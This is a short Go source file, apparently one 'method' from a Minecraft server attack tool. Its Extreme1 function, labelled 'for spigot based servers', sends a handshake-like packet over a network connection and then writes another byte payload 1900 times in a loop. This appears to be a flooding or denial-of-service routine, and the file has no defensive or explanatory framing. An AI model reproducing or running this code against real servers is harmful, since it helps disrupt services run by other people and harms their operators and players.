package methods

import (
	"net"
)

var bytes = makeBytes(15, 0, 99, 453, "localhost", 457, 1)

//Extreme1 is for spigot based servers
func Extreme1(out net.Conn) error {
	_, err := out.Write(bytes)

	for n := 0; n < 1900; n++ {
		out.Write(minorBytes)
	}

	return err
}
